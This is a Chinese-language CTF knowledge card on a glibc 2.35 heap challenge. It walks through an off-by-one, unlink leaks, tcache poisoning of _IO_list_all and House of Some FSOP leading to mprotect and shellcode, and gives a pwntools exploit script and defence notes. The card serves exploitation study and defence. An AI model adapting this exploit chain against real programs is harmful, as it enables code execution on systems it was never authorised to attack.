---
id: binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile
title: Robo_admin 堆题链：off-by-one 改 size + unlink 泄露 + House of Some + IO_FILE FSOP 执行 shellcode
type: scenario
domain: binary
path: binary/pwn/heap
technique: note-offbyone-unlink-house-of-some-iofile
tags:
- pwn
- heap
- off-by-one
- unlink
- house-of-some
- io-file
- fsop
- tcache
- safe-linking
- glibc-2.35
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:13:53+08:00'
  notes: 已对照原文脚本核对：7 个 chunk 布局、edit 写 size+1、0x158 重叠、fake chunk 0x30/0x31/0x451、delete(3) unlink、query(4) 泄露 libc-0x21ace0 与 safe-linking 堆地址、tcache 投毒 _IO_list_all+0x21b680、House of Some 模板与 mprotect+shellcode 均与原文一致。原文未展开 House of Some 内部字段，卡片标注 confidence medium 并在边界说明；卡片所述 setcontext 枢轴为按 FSOP 常见路径的推断（原文仅给出 _IO_wfile_overflow/_IO_wdoallocbuf 断点），未验证。PoC 未本机复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile/
draft: false
kb_aliases:
- Robo_admin
- robo_admin
- House of Some
- iolistall
- off-by-one unlink
- note manager
---

## 一句话结论

note 管理器的 `edit` 允许写入 `size+1` 字节，形成单字节 off-by-one；用它改相邻 chunk 的 size/prev_size，配合 fake chunk 触发 unlink 泄露 libc 与堆地址，再把 tcache fd 投毒到 `_IO_list_all`，写入 House of Some 生成的 fake `_IO_FILE`，退出时 FSOP 走 `mprotect` + shellcode 读 flag。

## 原理

- **off-by-one 来源**：`edit(index, length, content)` 只检查 `length` 与 chunk 大小的关系，允许 `length = size + 1`；多出的 1 字节写到下一个 chunk 的 `prev_size`/`size` 低字节，改变堆块边界。
- **堆布局与重叠**：先申请 7 个 chunk（0x118/0x138/0x108/0x138/0x118/0xf8/0xf8），用 off-by-one 改 chunk 4/1/6/7 的相邻 size；释放 2/5 后以 0x158 重新申请，使 chunk 2/5 与旧块重叠。
- **fake chunk + unlink**：在 chunk 2 的可控数据里布置 `prev_size/size` 为 `0x30/0x31`、`0x30/0x451` 的 fake chunk 头；清掉目标 chunk 的 `PREV_INUSE` 后释放，触发向后合并。glibc 2.35 的 unlink 会检查 `FD->bk == P && BK->fd == P`，所以 fd/bk 必须指向可控位置；unlink 把堆指针写到目标，形成 libc/堆泄露或任意写。
- **泄露**：`query(4)` 读 unsorted bin 的 fd，减去 libc 偏移 `0x21ace0` 得 libc base；再申请/释放 0x80 chunk，读 tcache fd（safe-linking 编码 `(chunk_addr >> 12) ^ next`），`heapaddr = (leak << 12) - 0x1000`。
- **tcache 投毒**：`edit(4, 7, p64((iolistall >> 12) ^ (heapaddr + 0x1e10)))` 把 tcache fd 编码为 `_IO_list_all`；连续两次 0x80 分配，第一次返回被投毒块，第二次返回 `_IO_list_all`，从而在 `_IO_list_all` 处写 fake `_IO_FILE_plus`。
- **House of Some**：用公开的 `SomeofHouse` 模板（`HouseOfSome`/`hoi_read_file_template`/`bomb_raw`）在堆上布置 fake `_IO_FILE` 与 ROP 链；退出时 `_IO_list_all` 指向的 fake FILE 经 `_IO_wfile_overflow`/`_IO_wdoallocbuf` 走到 `setcontext`，把栈枢轴到 ROP。
- **最终 ROP/shellcode**：`mprotect(shellcodeaddr, 0x3000, 7)` 后跳到 chunk 5 中的 shellcode；shellcode 用 `openat2("/flag")`、`readv`、`writev` 输出 flag。
- **本题 PoC 说明**：原文只给脚本与关键偏移，未逐条解释 unlink/House of Some 的内部字段；卡片按脚本还原链式步骤，具体 fake FILE 字段偏移以目标 glibc 2.35 为准。

## 触发条件

- glibc 2.35（Ubuntu 22.04 一类）堆题，存在 note 管理菜单与 `edit` 长度校验缺陷。
- `edit` 可写 `size+1` 字节（单字节溢出），且 `delete` 会触发合并/unlink。
- 程序有 `query/show` 可读 chunk 内容，能泄露 unsorted bin/tcache fd。
- tcache 可用且目标 `_IO_list_all` 可通过 tcache 投毒命中；退出路径会遍历 `_IO_list_all`。
- 有可控的 shellcode 存放块，且能调用 `mprotect`（或已有可写可执行段）。

## 利用步骤

1. 申请 7 个 chunk：0x118、0x138、0x108、0x138、0x118、0xf8、0xf8；记录 index 与大小。
2. 对 chunk 4/1 做 `size+1` 写，改相邻 chunk 的 size 低字节；释放 2/5，再以 0x158 申请，制造重叠块。
3. 在 chunk 2 写入 fake chunk 头（`0x30/0x31`、`0x30/0x451`），对 chunk 6/7 再做 off-by-one，释放 chunk 3 触发 unlink。
4. 释放 0/1 后用 `query(4)` 泄露 libc（`-0x21ace0`）；申请/释放 0x80 后再次 `query(4)` 泄露堆（safe-linking 解码）。
5. 把 shellcode 写入 chunk 5；用 House of Some 模板在堆上布置 fake FILE/ROP；把模板写回重叠 chunk 2。
6. 投毒 tcache fd 到 `_IO_list_all`，连续两次 0x80 分配，第二次落到 `_IO_list_all`；写入 fake `_IO_FILE_plus`。
7. 触发退出菜单（本题菜单 6→4），FSOP 走 `setcontext` 到 ROP；`mprotect` 后执行 shellcode 读 `/flag`。

## PoC

关键堆布局与 payload（按原文脚本改写，完整 exp 依赖 `SomeofHouse` 库，未在本库复跑）：

```python
from pwn import *

add(0, b"0", 0x118); add(1, b"1", 0x138); add(2, b"2", 0x108)
add(3, b"3", 0x138); add(4, b"4", 0x118); add(5, b"5", 0xf8); add(6, b"6", 0xf8)

edit(4, 0x119, b"a" * 0x118 + b"\x61")   # off-by-one
edit(1, 0x139, b"a" * 0x138 + b"\x61")
delete(2); delete(5)
add(5, b"5", 0x158); add(2, b"2", 0x158)

edit(2, 0x110,
     (0xd0 - 0x30) * b"a" + p64(0) + p64(0x31) + b"a" * 0x20 +
     p64(0x30) + p64(0x31) + b"a" * 0x20 + p64(0x30) + p64(0x451))
edit(6, 0xf0, b"b" * 0xe8 + p64(0x11))
delete(3)
add(7, b"7", 0x130)
edit(7, 0x131, b"a" * 0x130 + p64(0) + p64(0x121))

delete(0); delete(1)
query(4)
libcbase = u64(p.recv(6).ljust(8, b"\x00")) - 0x21ace0
add(0, b"0", 0x80); delete(0)
query(4)
heapaddr = (u64(p.recv(5).ljust(8, b"\x00")) << 12) - 0x1000

# shellcode 写入 chunk 5；House of Some 模板写入 chunk 2
shellcodeaddr = heapaddr + 0x1f30
edit(5, 0x140, asm(shellcode))
hoi = HouseOfSome(libc, heapaddr + 0x2150)
pad = hoi.hoi_read_file_template(heapaddr + 0x2150, 0x300, heapaddr + 0x2150, 0)
edit(2, 0x158, pad)

# tcache 投毒到 _IO_list_all
iolistall = libcbase + 0x21b680
edit(4, 0x7, p64((iolistall >> 12) ^ (heapaddr + 0x1e10)))
add(0, b"0", 0x80)
edit(5, 0x140, asm(shellcode))
add(1, b"1", 0x80)  # 返回 _IO_list_all

chunkaddr = heapaddr + 0x1bc0
payload  = p64(chunkaddr) + p64(0) * 3 + p64(0x00000000fbad2087)
payload += p64(libcbase + 0x21b723) * 7 + p64(libcbase + 0x21b723 + 1)
payload += p64(0) * 4 + p64(libcbase + 0x21b780) + p64(2)
payload += p64(0xffffffffffffffff) + p64(0) + p64(libcbase + 0x21a8a0)
edit(1, 0x80, payload)

# 触发退出 -> FSOP -> mprotect(shellcodeaddr,0x3000,7) -> shellcode
```

## 变体与关联

- **off-by-one 变体**：改 `size` 低字节、改 `prev_size`、清 `PREV_INUSE`；目标是制造重叠块或 fake chunk。
- **unlink 变体**：glibc 2.23 的 unsafe unlink 可直接写全局指针；2.35 需要满足 `FD->bk/BK->fd` 校验，通常配合堆泄露。
- **FSOP 变体**：House of Some、House of Apple、`_IO_wfile_jumps`/`_IO_str_jumps`、`setcontext` 枢轴；核心是让退出路径走到可控 vtable。
- **关联卡片**：[[binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system]]（unsafe unlink）、[[binary-pwn-heap-house-of-storm-unsorted-largebin-fake-chunk]]（House of Storm）、[[binary-pwn-heap-stdout-partial-overwrite-libc-leak]]（IO_FILE 泄露）、[[binary-pwn-format-string-decode-after-filter-bypass]]（本题入口）。
- **边界**：House of Some 的 fake FILE 字段/偏移依赖具体 libc；原文脚本使用外部 `SomeofHouse` 库，未在本库复跑；若目标 glibc 版本/编译选项不同，需重新计算偏移。

## 检测与防御

- **代码修复**：`edit` 严格校验 `length <= chunk_size`；对索引、大小、状态做边界检查；释放后清空指针，避免 UAF/重叠。
- **编译缓解**：Full RELRO、Canary、PIE、FORTIFY；glibc 2.35 的 unlink 校验与 tcache safe-linking 只能提高门槛。
- **检测信号**：note 管理器的 `edit` 允许 `size+1`；堆块 size 字段异常（0x31/0x451 等伪造头）；tcache fd 指向 libc 的 `_IO_list_all`；退出时异常 FSOP。
- **CTF 逆向**：先确认 edit 长度校验与 chunk 布局，再找泄露点；FSOP 前确保 `_IO_list_all` 可写且退出路径会遍历。
